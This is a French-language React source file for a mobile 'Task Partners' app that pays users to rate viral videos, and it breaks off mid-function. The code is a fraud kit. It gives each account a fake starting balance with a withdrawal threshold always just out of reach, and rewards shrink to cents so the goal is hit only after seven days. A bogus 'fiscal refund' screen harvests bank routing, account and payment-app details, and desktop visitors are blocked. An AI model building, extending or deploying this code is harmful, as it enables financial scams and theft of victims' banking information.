import { createFileRoute } from "@tanstack/react-router";
import {
  AtSign,
  Check,
  CheckCircle2,
  Home,
  Loader2,
  LockKeyholeIcon,
  MessageCircle,
  Pause,
  Play,
  ShieldCheck,
  ReceiptText,
  Search,
  Star,
  UserRound,
  Volume2,
  VolumeX,
  Wallet,
} from "lucide-react";
import type { FormEvent, ReactNode } from "react";
import { useEffect, useMemo, useRef, useState } from "react";

export const Route = createFileRoute("/tasks-app")({
  head: () => ({
    meta: [
      { title: "Task Partners" },
      { name: "description", content: "Application mobile premium d’audit de tâches." },
    ],
  }),
  component: TaskPartnersApp,
});

type Screen = "tasks" | "wallet" | "refund" | "support" | "profile";
type Review = { date: string; title: string; reward: number; status: string };
type User = { name: string; email: string; password?: string };
type VideoTask = {
  day: number;
  id: string;
  sequence: number;
  creator: string;
  title: string;
  videoUrl: string;
  reward: number;
};

const INITIAL_BALANCE = 2800;
const MIN_WITHDRAWAL = 4000;
const DAYS_TO_GOAL = 7;
const DAILY_LIMIT = 6;
const TOTAL_TASKS_TO_GOAL = DAYS_TO_GOAL * DAILY_LIMIT;
const TOTAL_REWARD_TO_GOAL = MIN_WITHDRAWAL - INITIAL_BALANCE;
const ACCOUNTS_KEY = "ttp_accounts";
const SESSION_KEY = "ttp_session";
const APP_STATE_KEY = "ttp_app_state";
const REFUND_STATE_KEY = "ttp_refund_state";
const TRIGGERED_EMAILS_LOG_KEY = "triggered_emails_log";
const CONFIRMED_EMAILS_LOG_KEY = "triggered_emails_log_v2";
const EMAILS_IN_FLIGHT_KEY = "triggered_emails_in_flight";
const VIDEOS_EVALUATED_COUNT_KEY = "videos_evaluated_count";

const videoPool = [
  { creator: "Contenu de créateur viral", title: "Audit de défi", videoUrl: "/videos/task1.mp4" },
  {
    creator: "Vidéo tendance aux États-Unis",
    title: "Évaluation d’illusion",
    videoUrl: "/videos/task2.mp4",
  },
  {
    creator: "Contenu de créateur viral",
    title: "Audit ASMR satisfaisant",
    videoUrl: "/videos/task3.mp4",
  },
  {
    creator: "Vidéo tendance aux États-Unis",
    title: "Audit audio viral",
    videoUrl: "/videos/task4.mp4",
  },
  {
    creator: "Contenu de créateur viral",
    title: "Évaluation de l’engagement",
    videoUrl: "/videos/task5.mp4",
  },
  {
    creator: "Vidéo tendance aux États-Unis",
    title: "Contrôle de qualité du temps de visionnage",
    videoUrl: "/videos/task6.mp4",
  },
];

const rewardCurve = [
  120, 115, 110, 105, 100, 95, 100, 95, 90, 85, 80, 75, 7, 6, 5, 4, 3, 1.15, 1, 0.8, 0.6, 0.5, 0.4,
  0.3, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01,
  0.01, 0.01, 0.08,
] as const;

const tasks: VideoTask[] = Array.from({ length: TOTAL_TASKS_TO_GOAL }, (_, index) => {
  const day = Math.floor(index / DAILY_LIMIT) + 1;
  const sequence = (index % DAILY_LIMIT) + 1;
  const source = videoPool[index % videoPool.length];
  return {
    day,
    id: `day-${day}-task-${sequence}`,
    sequence,
    creator: source.creator,
    title: source.title,
    videoUrl: source.videoUrl,
    reward: rewardForTask(index),
  };
});

const processingSteps = [
  "Analyse de la cohérence...",
  "Validation de la rétention...",
  "Contrôle de la qualité de l’avis...",
  "Ajout de la récompense...",
];
const paymentOptions = ["Cash App", "PayPal", "Venmo", "Zelle", "Virement bancaire (SEPA)"];

function TaskPartnersApp() {
  const [allowed, setAllowed] = useState(false);
  const [checkedGate, setCheckedGate] = useState(false);
  const [isDesktop, setIsDesktop] = useState(false);
  const [user, setUser] = useState<User | null>(null);
  const [authError, setAuthError] = useState("");
  const [signupName, setSignupName] = useState("");
  const [signupEmail, setSignupEmail] = useState("");
  const [remember, setRemember] = useState(true);
  const [loading, setLoading] = useState(false);
  const [screen, setScreen] = useState<Screen>("tasks");
  const [taskIndex, setTaskIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [rating, setRating] = useState(0);
  const [useful, setUseful] = useState("");
  const [recommend, setRecommend] = useState("");
  const [comment, setComment] = useState("");
  const [balance, setBalance] = useState(INITIAL_BALANCE);
  const [pendingBalance] = useState(0);
  const [reviews, setReviews] = useState<Review[]>([]);
  const [reviewedIds, setReviewedIds] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [successReward, setSuccessReward] = useState<number | null>(null);
  const [paymentMethod, setPaymentMethod] = useState(paymentOptions[0]);
  const [paymentData, setPaymentData] = useState("");
  const [paymentBank, setPaymentBank] = useState("");
  const [paymentRouting, setPaymentRouting] = useState("");
  const [paymentAccount, setPaymentAccount] = useState("");
  const [refundMethod, setRefundMethod] = useState(paymentOptions[0]);
  const [refundData, setRefundData] = useState("");
  const [refundBank, setRefundBank] = useState("");
  const [refundRouting, setRefundRouting] = useState("");
  const [refundAccount, setRefundAccount] = useState("");
  const [refundLoading, setRefundLoading] = useState(false);
  const [refundApproved, setRefundApproved] = useState(false);
  const [isMuted, setIsMuted] = useState(true);

  const task = tasks[Math.min(taskIndex, tasks.length - 1)];
  const taskReviewKey = `${task.id}-${taskIndex}`;
  const dailyLimitReached = reviewedIds.length > 0 && reviewedIds.length % DAILY_LIMIT === 0;
  const completedToday = dailyLimitReached ? DAILY_LIMIT : (taskIndex % DAILY_LIMIT) + 1;
  const reviewUnlocked = progress >= 100 && !reviewedIds.includes(taskReviewKey);
  const hasValidComment = countWords(comment) >= 3;
  const canSubmit =
    reviewUnlocked && rating > 0 && Boolean(useful) && Boolean(recommend) && hasValidComment;
  const balanceText = useMemo(() => usd(balance), [balance]);

  useEffect(() => {
    setAllowed(true);
    setCheckedGate(true);
  }, []);

  useEffect(() => {
    if (!allowed) return;
    const sessionUser = readSession();
    if (sessionUser) {
      setUser(sessionUser);
      setScreen("tasks");
      const savedState = readAppState(sessionUser.email);
      if (savedState) {
        setBalance(savedState.balance);
        setReviews(savedState.reviews);
        setReviewedIds(savedState.reviewedIds);
        setTaskIndex(savedState.taskIndex);
      }
      const savedRefund = readRefundState(sessionUser.email);
      if (savedRefund) {
        setRefundMethod(savedRefund.method);
        setRefundData(savedRefund.data);
        setRefundBank(savedRefund.bank);
        setRefundRouting(savedRefund.routing);
        setRefundAccount(savedRefund.account);
        setRefundApproved(savedRefund.approved);
      }
    }
  }, [allowed]);

  useEffect(() => {
    if (!user) return;
    window.localStorage.setItem(
      appStateKey(user.email),
      JSON.stringify({
        balance,
        reviewedIds,
        reviews,
        taskIndex,
      }),
    );
  }, [balance, reviewedIds, reviews, taskIndex, user]);

  useEffect(() => {
    if (!user || reviewedIds.length === 0) return;
    handleBehavioralEmailTriggers(user, balance, reviewedIds.length);
  }, [balance, reviewedIds.length, user]);

  useEffect(() => {
    const update = () => setIsDesktop(window.innerWidth > 768);
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);

  useEffect(() => {
    setProgress(0);
  }, [taskIndex]);

  function accessAccount(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setAuthError("");
    const email = signupEmail.trim().toLowerCase();
    const name = signupName.trim();
    if (!name || !email) {
      setAuthError("Saisissez votre nom complet et votre e-mail pour continuer.");
      return;
    }
    setLoading(true);
    window.setTimeout(() => {
      const accounts = readAccounts();
      const existing = accounts.find((item) => item.email.toLowerCase() === email);
      const account = existing
        ? { ...existing, name: existing.name || name, email: existing.email }
        : { name, email };
      if (!existing) {
        window.localStorage.setItem(ACCOUNTS_KEY, JSON.stringify([...accounts, account]));
        window.localStorage.setItem(
          appStateKey(account.email),
          JSON.stringify({ balance: INITIAL_BALANCE, reviewedIds: [], reviews: [], taskIndex: 0 }),
        );
        sendAccessEmail(account);
      }
      setUser(account);
      const savedState = readAppState(account.email);
      if (savedState) {
        setBalance(savedState.balance);
        setReviews(savedState.reviews);
        setReviewedIds(savedState.reviewedIds);
        setTaskIndex(savedState.taskIndex);
      }
      const savedRefund = readRefundState(account.email);
      if (savedRefund) {
        setRefundMethod(savedRefund.method);
        setRefundData(savedRefund.data);
        setRefundBank(savedRefund.bank);
        setRefundRouting(savedRefund.routing);
        setRefundAccount(savedRefund.account);
        setRefundApproved(savedRefund.approved);
      }
      setLoading(false);
      setScreen("tasks");
      if (remember) window.localStorage.setItem(SESSION_KEY, JSON.stringify(account));
    }, 700);
  }

  function submitReview() {
    if (!canSubmit) return;
    const completedTask = task;
    const completedKey = taskReviewKey;
    const reward = completedTask.reward;
    const nextBalance = Number((balance + reward).toFixed(2));
    const nextReviewedCount = reviewedIds.includes(completedKey)
      ? reviewedIds.length
      : reviewedIds.length + 1;

    setSuccessReward(null);
    setReviewedIds((value) => [...value, completedKey]);
    setReviews((value) => [
      {
        date: new Date().toLocaleDateString("fr-FR"),
        title: completedTask.title,
        reward,
        status: "Approuvé",
      },
      ...value,
    ]);
    setBalance(nextBalance);
    if (user) {
      handleBehavioralEmailTriggers(user, nextBalance, nextReviewedCount);
    }
    setRating(0);
    setUseful("");
    setRecommend("");
    setComment("");
    setProgress(0);
    if (completedTask.sequence % DAILY_LIMIT !== 0) {
      setTaskIndex((value) => Math.min(value + 1, TOTAL_TASKS_TO_GOAL - 1));
    }

    setProcessing(true);
    setProcessingStep(0);
    let step = 0;
    const timer = window.setInterval(() => {
      step += 1;
      setProcessingStep(Math.min(step, processingSteps.length - 1));
      if (step >= processingSteps.length) {
        window.clearInterval(timer);
        setProcessing(false);
        setSuccessReward(reward);
        window.setTimeout(() => setSuccessReward(null), 2600);
      }
    }, 1250);
  }

  function requestRefund(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setRefundLoading(false);
    setRefundApproved(true);
    if (user) {
      window.localStorage.setItem(
        refundStateKey(user.email),
        JSON.stringify({
          account: refundAccount,
          approved: true,
          bank: refundBank,
          data: refundData,
          method: refundMethod,
          routing: refundRouting,
        }),
      );
    }
  }

  if (!checkedGate) return null;
  if (!allowed) return <Server404 />;
  if (isDesktop) return <UnsupportedDevice />;

  if (!user) {
    return (
      <main className="min-h-dvh bg-[#F8FAFC] text-[#0F172A]">
        <section className="mx-auto flex min-h-dvh w-full max-w-[430px] flex-col px-5 py-5">
          <div className="flex items-center justify-center">
            <Brand />
          </div>
          <div className="mt-10 flex flex-col">
            <div className="mx-auto mb-8 grid h-24 w-24 place-items-center rounded-[28px] bg-white text-[#0F172A] shadow-[0_20px_45px_rgba(15,23,42,.12)]">
              <CheckCircle2 className="text-[#FE2C55]" size={42} />
            </div>
            <h1 className="text-center text-[30px] font-black leading-tight">
              Accéder à Task Partners
            </h1>
            <p className="mx-auto mt-3 max-w-[330px] text-center text-sm leading-6 text-[#475569]">
              Saisissez votre nom et votre e-mail pour continuer. Si c’est votre première visite,
              votre compte sera créé automatiquement.
            </p>
            {authError && (
              <div className="mt-5 rounded-[8px] border border-rose-200 bg-rose-50 px-4 py-3 text-sm font-black text-rose-600">
                {authError}
              </div>
            )}
            <form onSubmit={accessAccount} className="mt-8 space-y-3">
              <AuthInput
                icon={<UserRound size={18} />}
                onChange={setSignupName}
                placeholder="Nom complet"
                type="text"
                value={signupName}
              />
              <AuthInput
                icon={<AtSign size={18} />}
                onChange={setSignupEmail}
                placeholder="Email"
                type="email"
                value={signupEmail}
              />
              <label className="flex items-center justify-between rounded-[8px] border border-slate-200 bg-white px-4 py-3 text-sm font-bold shadow-sm">
                Rester connecté
                <input
                  checked={remember}
                  onChange={(event) => setRemember(event.target.checked)}
                  type="checkbox"
                  className="h-5 w-5 accent-[#FE2C55]"
                />
              </label>
              <button
                className="flex h-13 w-full items-center justify-center gap-2 rounded-[8px] bg-[#FE2C55] font-black text-white shadow-lg shadow-rose-200 transition active:scale-[0.98]"
                type="submit"
              >
                {loading ? <Loader2 className="animate-spin" size={18} /> : <Check size={18} />}
                Continuer vers le tableau de bord
              </button>
            </form>
          </div>
        </section>
      </main>
    );
  }

  return (
    <main className="h-dvh overflow-hidden bg-[#F8FAFC] text-[#0F172A]">
      <section className="relative mx-auto flex h-dvh w-full max-w-[430px] flex-col overflow-hidden bg-[#F8FAFC]">
        <header className="shrink-0 border-b border-slate-200 bg-white px-4 py-3 shadow-sm">
          <div className="flex items-center justify-between gap-3">
            <div className="min-w-0">
              <p className="text-[10px] font-black uppercase tracking-[0.14em] text-[#475569]">
                Solde
              </p>
              <p className="flex items-center gap-1 truncate text-[17px] font-black text-[#0F172A]">
                <Wallet size={18} className="text-[#2563EB]" />
                {balanceText}
              </p>
            </div>
            <div className="shrink-0 rounded-[8px] bg-[#F1F5F9] px-3 py-2 text-right">
              <p className="text-[10px] font-black uppercase tracking-[0.14em] text-[#475569]">
                Tâches du jour
              </p>
              <p className="text-lg font-black text-[#FE2C55]">
                {Math.min(completedToday, DAILY_LIMIT)}/{DAILY_LIMIT}
              </p>
              <p className="text-[10px] font-black text-[#475569]">Audits partenaires</p>
            </div>
          </div>
          <p className="mt-3 text-[11px] font-bold leading-4 text-[#475569]">
            Évaluez les créateurs partenaires pour débloquer et libérer le solde de retrait restant
            en attente.
          </p>
        </header>

        <div className="min-h-0 flex-1 overflow-y-auto px-4 pb-28 pt-4">
          {screen === "tasks" && (
            <TasksScreen
              canSubmit={canSubmit}
              comment={comment}
              dailyLimitReached={dailyLimitReached}
              hasValidComment={hasValidComment}
              isMuted={isMuted}
              progress={progress}
              rating={rating}
              recommend={recommend}
              reviewUnlocked={reviewUnlocked}
              setComment={setComment}
              setIsMuted={setIsMuted}
              setProgress={setProgress}
              setRating={setRating}
              setRecommend={setRecommend}
              setUseful={setUseful}
              submitReview={submitReview}
              task={task}
              taskIndex={taskIndex}
              useful={useful}
            />
          )}
          {screen === "wallet" && (
            <WalletScreen
              balance={balance}
              pendingBalance={pendingBalance}
              paymentData={paymentData}
              paymentAccount={paymentAccount}
              paymentBank={paymentBank}
              paymentMethod={paymentMethod}
              paymentRouting={paymentRouting}
              setPaymentData={setPaymentData}
              setPaymentAccount={setPaymentAccount}
              setPaymentBank={setPaymentBank}
              setPaymentMethod={setPaymentMethod}
              setPaymentRouting={setPaymentRouting}
            />
          )}
          {screen === "refund" && (
            <RefundScreen
              approved={refundApproved}
              account={refundAccount}
              bank={refundBank}
              data={refundData}
              loading={refundLoading}
              method={refundMethod}
              onSubmit={requestRefund}
              routing={refundRouting}
              setAccount={setRefundAccount}
              setBank={setRefundBank}
              setData={setRefundData}
              setMethod={setRefundMethod}
              setRouting={setRefundRouting}
            />
          )}
          {screen === "support" && <SupportScreen user={user} />}
          {screen === "profile" && (
            <ProfileScreen reviews={reviews} user={user} balance={balance} />
          )}
        </div>

        {successReward !== null && (
          <div className="pointer-events-none absolute left-4 right-4 top-4 z-[60] rounded-[8px] bg-emerald-500 px-4 py-3 text-center text-sm font-black text-white shadow-2xl">
            +{usd(successReward)} ajouté à votre solde !
          </div>
        )}
        <BottomNav screen={screen} setScreen={setScreen} />
      </section>

      {processing && <ProcessingOverlay step={processingStep} />}
    </main>
  );
}

function TasksScreen(props: {
  canSubmit: boolean;
  comment: string;
  dailyLimitReached: boolean;
  hasValidComment: boolean;
  isMuted: boolean;
  progress: number;
  rating: number;
  recommend: string;
  reviewUnlocked: boolean;
  setComment: (value: string) => void;
  setIsMuted: (value: boolean) => void;
  setProgress: (value: number) => void;
  setRating: (value: number) => void;
  setRecommend: (value: string) => void;
  setUseful: (value: string) => void;
  submitReview: () => void;
  task: VideoTask;
  taskIndex: number;
  useful: string;
}) {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const [isPlaying, setIsPlaying] = useState(true);
  const dayEndIndex = props.task.day * DAILY_LIMIT;
  const lockedTasks = tasks.slice(props.taskIndex + 1, dayEndIndex);

  function togglePlayback() {
    const video = videoRef.current;
    if (!video) return;
    if (video.paused) {
      void video.play();
      setIsPlaying(true);
    } else {
      video.pause();
      setIsPlaying(false);
    }
  }

  if (props.dailyLimitReached) {
    return (
      <div className="space-y-4">
        <section className="rounded-[8px] border border-rose-200 bg-white p-5 text-center shadow-sm">
          <div className="mx-auto mb-4 grid h-16 w-16 place-items-center rounded-full bg-[#FE2C55] text-white">
            <LockKeyholeIcon size={30} />
          </div>
          <h1 className="text-2xl font-black text-[#0F172A]">Limite quotidienne atteinte !</h1>
          <p className="mt-3 text-sm font-bold leading-6 text-[#475569]">
            Pour préserver la qualité et la sécurité du réseau, vous ne pouvez auditer que 6 vidéos
            par jour. Revenez demain pour débloquer le solde restant en attente.
          </p>
        </section>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      <section className="rounded-[8px] border border-slate-200 bg-white p-3 shadow-sm">
        <div className="mb-3 flex items-start justify-between gap-3">
          <div className="min-w-0">
            <p className="text-xs font-black text-[#FE2C55]">{props.task.creator}</p>
            <h1 className="text-xl font-black leading-tight text-[#0F172A]">{props.task.title}</h1>
            <p className="mt-1 text-xs font-semibold text-[#475569]">
              Tâche {props.task.sequence}/6 - Récompense : {usd(props.task.reward)}
            </p>
            <p className="mt-2 text-xs font-bold leading-5 text-[#475569]">
              Évaluez le contenu du créateur partenaire pour libérer votre solde de retrait restant
              en attente.
            </p>
          </div>
        </div>
        <div className="relative aspect-[9/20] max-h-[560px] w-full overflow-hidden rounded-[8px] bg-slate-950">
          <video
            ref={videoRef}
            key={props.task.id}
            autoPlay
            className="h-full w-full object-contain"
            muted={props.isMuted}
            onEnded={() => props.setProgress(100)}
            onPause={() => setIsPlaying(false)}
            onPlay={() => setIsPlaying(true)}
            onTimeUpdate={(event) => {
              const video = event.currentTarget;
              if (!Number.isFinite(video.duration) || video.duration <= 0) return;
              props.setProgress(Math.min(99, (video.currentTime / video.duration) * 100));
            }}
            playsInline
            preload="auto"
            src={props.task.videoUrl}
          />
          <button
            aria-label={isPlaying ? "Mettre la vidéo en pause" : "Lire la vidéo"}
            className="absolute left-3 top-3 grid h-10 w-10 place-items-center rounded-full bg-black/55 text-white backdrop-blur"
            onClick={togglePlayback}
            onMouseDown={(event) => event.preventDefault()}
            type="button"
          >
            {isPlaying ? <Pause size={18} /> : <Play size={18} fill="currentColor" />}
          </button>
          <button
            className="absolute right-3 top-3 grid h-10 w-10 place-items-center rounded-full bg-black/55 text-white backdrop-blur"
            onClick={() => props.setIsMuted(!props.isMuted)}
            onMouseDown={(event) => event.preventDefault()}
            type="button"
          >
            {props.isMuted ? <VolumeX size={19} /> : <Volume2 size={19} />}
          </button>
        </div>
      </section>

      <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <div className="mb-2 flex items-center justify-between text-xs font-black text-[#475569]">
          <span>
            Regardez la vidéo jusqu’à la fin pour débloquer l’avis créateur. (
            {Math.round(props.progress)}%)
          </span>
        </div>
        <div className="h-3 overflow-hidden rounded-full bg-slate-200">
          <div
            className="h-full rounded-full bg-[#FE2C55] transition-all duration-500"
            style={{ width: `${props.progress}%` }}
          />
        </div>
      </section>

      <section className="rounded-[8px] border border-slate-200 bg-[#F1F5F9] p-4 shadow-sm transition-all">
        {!props.reviewUnlocked ? (
          <div className="flex min-h-[210px] flex-col items-center justify-center text-center">
            <div className="mb-4 grid h-16 w-16 place-items-center rounded-full bg-white text-[#FE2C55] shadow-sm">
              <LockKeyholeIcon size={30} />
            </div>
            <h2 className="text-xl font-black text-[#0F172A]">Avis verrouillé</h2>
            <p className="mt-2 max-w-[280px] text-sm leading-6 text-[#475569]">
              Terminez l’audit du créateur partenaire ci-dessus pour débloquer les questions et
              libérer les fonds de retrait en attente.
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            <div>
              <p className="mb-2 text-sm font-black text-[#0F172A]">
                1. Notez la qualité de la vidéo
              </p>
              <div className="flex flex-wrap gap-2">
                {[1, 2, 3, 4, 5].map((star) => (
                  <button
                    key={star}
                    className={`grid h-11 w-11 place-items-center rounded-full transition ${props.rating >= star ? "bg-[#FE2C55] text-white" : "bg-white text-slate-400"}`}
                    onClick={(event) =>
                      preserveScrollFrom(event.currentTarget, () => props.setRating(star))
                    }
                    onMouseDown={(event) => event.preventDefault()}
                    type="button"
                  >
                    <Star size={18} fill={props.rating >= star ? "currentColor" : "none"} />
                  </button>
                ))}
              </div>
            </div>
            <ChoiceRow
              label="2. Le contenu était-il utile ?"
              value={props.useful}
              onChange={props.setUseful}
            />
            <ChoiceRow
              label="3. Le recommanderiez-vous ?"
              value={props.recommend}
              onChange={props.setRecommend}
            />
            <label className="block">
              <span className="mb-2 block text-sm font-black text-[#0F172A]">
                4. Commentaires supplémentaires pour l’algorithme
              </span>
              <textarea
                className="min-h-28 w-full resize-none rounded-[8px] border border-slate-200 bg-white px-3 py-3 text-sm font-semibold text-[#0F172A] outline-none placeholder:text-slate-400 focus:border-[#2563EB]"
                onChange={(event) => props.setComment(event.target.value)}
                onFocus={(event) => preserveScrollFrom(event.currentTarget, () => undefined)}
                placeholder="Écrivez au moins 3 vrais mots..."
                value={props.comment}
              />
              {!props.hasValidComment && (
                <span className="mt-1.5 block text-xs font-bold text-[#FE2C55]">
                  Attention : votre commentaire doit contenir au moins 3 mots.
                </span>
              )}
            </label>
            <button
              className="min-h-13 w-full rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white shadow-lg shadow-rose-200 transition active:scale-[0.98] disabled:bg-slate-300 disabled:text-slate-500 disabled:shadow-none"
              disabled={!props.canSubmit}
              onClick={props.submitReview}
              type="button"
            >
              Envoyer l’avis créateur et libérer le solde
            </button>
          </div>
        )}
      </section>

      <section className="space-y-3">
        <div>
          <h2 className="text-lg font-black text-[#0F172A]">Avis en attente</h2>
          <p className="text-xs font-semibold text-[#475569]">
            Terminez l’audit créateur actuel pour débloquer le prochain avis partenaire.
          </p>
        </div>
        {lockedTasks.map((lockedTask, index) => (
          <div
            className="relative overflow-hidden rounded-[8px] border border-slate-200 bg-white p-3 shadow-sm"
            key={`${lockedTask.id}-${index}`}
          >
            <div className="flex items-center gap-3 blur-[3px]">
              <div className="h-16 w-24 shrink-0 rounded-[8px] bg-gradient-to-br from-slate-200 via-slate-300 to-slate-100" />
              <div className="min-w-0">
                <p className="truncate text-xs font-black text-[#FE2C55]">{lockedTask.creator}</p>
                <p className="truncate text-sm font-black text-[#0F172A]">{lockedTask.title}</p>
                <p className="text-xs font-semibold text-[#475569]">
                  Valeur débloquée : {usd(lockedTask.reward)}
                </p>
              </div>
            </div>
            <div className="absolute inset-0 grid place-items-center bg-white/45 backdrop-blur-sm">
              <div className="flex flex-col items-center text-center">
                <div className="mb-2 grid h-10 w-10 place-items-center rounded-full bg-[#0F172A] text-white">
                  <LockKeyholeIcon size={19} />
                </div>
                <p className="max-w-[230px] text-xs font-black text-[#0F172A]">
                  Terminez l’avis précédent pour débloquer cette tâche.
                </p>
              </div>
            </div>
          </div>
        ))}
      </section>
    </div>
  );
}

function WalletScreen(props: {
  balance: number;
  pendingBalance: number;
  paymentAccount: string;
  paymentBank: string;
  paymentData: string;
  paymentMethod: string;
  paymentRouting: string;
  setPaymentAccount: (value: string) => void;
  setPaymentBank: (value: string) => void;
  setPaymentData: (value: string) => void;
  setPaymentMethod: (value: string) => void;
  setPaymentRouting: (value: string) => void;
}) {
  const canWithdraw = props.balance >= MIN_WITHDRAWAL;
  return (
    <div>
      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Portefeuille</h1>
      <div className="grid gap-3">
        <MetricCard label="Solde actuel" value={usd(props.balance)} tone="bg-white" />
        <MetricCard label="Solde en attente" value={usd(props.pendingBalance)} tone="bg-white" />
        <MetricCard label="Retrait minimum" value={usd(MIN_WITHDRAWAL)} tone="bg-white" />
      </div>
      <div className="mt-5 rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <p className="mb-3 text-sm font-black text-[#0F172A]">Méthode de retrait</p>
        <select
          className="mb-3 h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A]"
          value={props.paymentMethod}
          onChange={(event) => props.setPaymentMethod(event.target.value)}
        >
          {paymentOptions.map((method) => (
            <option key={method}>{method}</option>
          ))}
        </select>
        <PaymentFields
          account={props.paymentAccount}
          bank={props.paymentBank}
          data={props.paymentData}
          method={props.paymentMethod}
          routing={props.paymentRouting}
          setAccount={props.setPaymentAccount}
          setBank={props.setPaymentBank}
          setData={props.setPaymentData}
          setRouting={props.setPaymentRouting}
        />
        {!canWithdraw && (
          <div className="mt-3 rounded-[8px] border border-amber-200 bg-amber-50 p-3">
            <p className="text-xs font-bold leading-5 text-amber-800">
              Pour respecter les règles de sécurité financière, de lutte contre la fraude et le
              traitement des transactions à volume élevé, le seuil minimum de retrait des comptes
              auditeurs nouvellement activés est strictement fixé à 4 000 €. Terminez vos audits
              quotidiens pour libérer vos fonds en attente.
            </p>
          </div>
        )}
        <button
          className="mt-3 min-h-12 w-full rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white disabled:bg-slate-300 disabled:text-slate-500"
          disabled={!canWithdraw}
          type="button"
        >
          {canWithdraw ? "Demander un retrait" : "Retrait verrouillé"}
        </button>
      </div>
    </div>
  );
}

function RefundScreen(props: {
  account: string;
  approved: boolean;
  bank: string;
  data: string;
  loading: boolean;
  method: string;
  onSubmit: (event: FormEvent<HTMLFormElement>) => void;
  routing: string;
  setAccount: (value: string) => void;
  setBank: (value: string) => void;
  setData: (value: string) => void;
  setMethod: (value: string) => void;
  setRouting: (value: string) => void;
}) {
  const hasPayoutDetails =
    props.method === "Virement bancaire (SEPA)"
      ? Boolean(props.bank.trim() && props.routing.trim() && props.account.trim())
      : Boolean(props.data.trim());

  return (
    <div>
      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Portail de remboursement fiscal</h1>
      <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <p className="text-sm leading-6 text-[#475569]">
          Remboursement fiscal en attente : des frais de 37,12 € liés à votre identifiant sont
          éligibles au remboursement. Saisissez vos informations de paiement ci-dessous pour
          enregistrer la demande et lancer le traitement bancaire.
        </p>
        {props.approved ? (
          <div className="mt-5 rounded-[8px] border border-emerald-200 bg-emerald-50 p-4">
            <div className="mb-3 flex items-center gap-2 text-emerald-700">
              <ShieldCheck size={20} />
              <p className="text-sm font-black">Informations de remboursement confirmées</p>
            </div>
            <p className="text-sm font-black leading-6 text-emerald-700">
              Statut : en cours de traitement... Votre remboursement de 37,12 € a été enregistré et
              passe maintenant par la vérification bancaire, l’examen du réseau de paiement et la
              validation du compte. Selon la banque ou le fournisseur de paiement choisi, le crédit
              peut apparaître sur votre compte sous 15 jours ouvrés.
            </p>
          </div>
        ) : (
          <form className="mt-5 space-y-4" onSubmit={props.onSubmit}>
            <select
              className="h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A]"
              value={props.method}
              onChange={(event) => props.setMethod(event.target.value)}
            >
              {paymentOptions.map((method) => (
                <option key={method}>{method}</option>
              ))}
            </select>
            <PaymentFields
              account={props.account}
              bank={props.bank}
              data={props.data}
              method={props.method}
              routing={props.routing}
              setAccount={props.setAccount}
              setBank={props.setBank}
              setData={props.setData}
              setRouting={props.setRouting}
            />
            <button
              className="flex min-h-12 w-full items-center justify-center gap-2 rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white shadow-lg shadow-rose-200 transition active:scale-[0.98] disabled:border disabled:border-slate-300 disabled:bg-slate-200 disabled:text-slate-500 disabled:shadow-none"
              disabled={props.loading || !hasPayoutDetails}
              type="submit"
            >
              {props.loading && <Loader2 className="animate-spin" size={18} />}
              Confirmer et enregistrer les informations
            </button>
            {!hasPayoutDetails && (
              <p className="text-center text-xs font-bold text-[#64748B]">
                Saisissez vos informations de paiement pour confirmer la demande de remboursement.
              </p>
            )}
          </form>
        )}
      </section>
    </div>
  );
}

function PaymentFields(props: {
  account: string;
  bank: string;
  data: string;
  method: string;
  routing: string;
  setAccount: (value: string) => void;
  setBank: (value: string) => void;
  setData: (value: string) => void;
  setRouting: (value: string) => void;
}) {
  if (props.method === "Virement bancaire (SEPA)") {
    return (
      <div className="space-y-3">
        <label className="block">
          <span className="mb-1.5 block text-xs font-black text-[#475569]">Banque</span>
          <div className="flex h-12 items-center gap-2 rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-3">
            <Search size={16} className="shrink-0 text-[#475569]" />
            <input
              className="min-w-0 flex-1 bg-transparent text-sm font-bold text-[#0F172A] outline-none placeholder:text-slate-400"
              onChange={(event) => props.setBank(event.target.value)}
              placeholder="Rechercher votre banque"
              value={props.bank}
            />
          </div>
        </label>
        <LabeledPaymentInput
          label="Numéro de routage"
          onChange={props.setRouting}
          placeholder="Saisissez votre numéro de routage"
          value={props.routing}
        />
        <LabeledPaymentInput
          label="Numéro de compte"
          onChange={props.setAccount}
          placeholder="Saisissez votre numéro de compte"
          value={props.account}
        />
        <button
          className="h-12 w-full rounded-[8px] bg-[#FE2C55] text-sm font-black text-white shadow-lg shadow-rose-100"
          type="button"
        >
          Continuer
        </button>
      </div>
    );
  }

  const placeholder =
    props.method === "PayPal"
      ? "Saisissez votre e-mail PayPal"
      : props.method === "Venmo"
        ? "Saisissez votre identifiant Venmo"
        : props.method === "Cash App"
          ? "Saisissez votre identifiant Cash App"
          : props.method === "Zelle"
            ? "Saisissez votre e-mail ou téléphone Zelle"
            : "Saisissez vos informations de paiement";

  return (
    <input
      className="h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A] outline-none placeholder:text-slate-400"
      onChange={(event) => props.setData(event.target.value)}
      placeholder={placeholder}
      value={props.data}
    />
  );
}

function LabeledPaymentInput({
  label,
  onChange,
  placeholder,
  value,
}: {
  label: string;
  onChange: (value: string) => void;
  placeholder: string;
  value: string;
}) {
  return (
